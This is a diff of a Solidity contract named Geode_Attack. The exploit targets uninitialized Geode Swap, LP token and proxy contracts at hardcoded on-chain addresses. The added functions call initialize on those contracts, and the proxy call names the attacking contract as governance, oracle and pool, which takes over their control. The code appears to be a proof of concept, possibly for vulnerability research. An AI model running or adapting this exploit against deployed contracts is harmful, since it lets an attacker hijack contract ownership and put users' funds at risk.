@@ -34,7 +34,7 @@ interface ISWAPUTILS {
 
 }
 
-interface IGEODE {
+interface IGEODESWAP {
 
     function swap(ISWAPUTILS.Swap memory self, uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx, uint256 minDy) external returns (uint256); 
 
@@ -57,6 +57,16 @@ interface IGEODE {
   function getToken()external view returns (uint256);
 }
 
+interface IGEODETOKEN {
+    function initialize(string memory name, string memory symbol) external;
+    function name() external returns (string memory);
+}
+
+
+interface IGEODEProxy {
+    function initialize(address gov, address oracle, address gavax, address swapPool, address _interface, address lpToken) external;
+    function name() external returns (string memory);
+}
 
 // @dev This contract calls initialize in the Geode Swap contract
 // On deploy, the Geode Swap contract is not initialized, allowing anyone to call the initialize function after deploy
@@ -64,15 +74,23 @@ contract Geode_Attack {
     using SafeERC20 for IERC20;
 
     address public owner;
-    IGEODE geode;
+    IGEODESWAP geodeswap;
+
+    IGEODETOKEN geodetoken;
+
+    IGEODEProxy proxy;
 
     constructor () {
         owner = msg.sender;
-        geode = IGEODE(0xCD8951A040Ce2c2890d3D92Ea4278FF23488B3ac);
+        geodeswap = IGEODESWAP(0xCD8951A040Ce2c2890d3D92Ea4278FF23488B3ac);
+
+        geodetoken = IGEODETOKEN(0x71B0CD5c4Db483aE8A09Df0f83F69BAC400dBe8c);
+
+        proxy = IGEODEProxy(0x4fe8C658f268842445Ae8f95D4D6D8Cfd356a8C8);
     }
 
     function callInitialize(address _gAvax, uint _pooledTokenId, string memory lpTokenName, string memory lpTokenSymbol, uint _a, uint _fee, uint _adminFee, address lpTokenTargetAddress) public {
-        address _token = geode.initialize(_gAvax, _pooledTokenId, lpTokenName, lpTokenSymbol, _a, _fee, _adminFee, lpTokenTargetAddress);
+        address _token = geodeswap.initialize(_gAvax, _pooledTokenId, lpTokenName, lpTokenSymbol, _a, _fee, _adminFee, lpTokenTargetAddress);
         console.log(_token);
 
         getLPname(_token);
@@ -93,7 +111,39 @@ contract Geode_Attack {
         console.log(name);
     }
 
+    // lp token
+    function callinitToken() public {
+        string memory name = "name XXX";
+        string memory symbol = "NAME";
 
+        geodetoken.initialize(name,symbol);
+
+        string memory _name = geodetoken.name();
+
+        console.log(_name);
+    }
+    
+
+    // proxy
+
+    function callinitProxy() public {
+
+        // address gov, address oracle, address gavax, address swapPool, address _interface, address lpToken)
+
+        address gov = address(this);
+        address oracle = address(this);
+        address gavax = address(this);
+        address swapPool = address(this);
+        address _interface = address(this);
+        address lpToken = address(this);
+
+
+        proxy.initialize(gov, oracle, gavax, swapPool, _interface, lpToken);
+
+        // string memory _name = geodetoken.name();
+
+        // console.log(_name);
+    }
 
 
     // ##########################
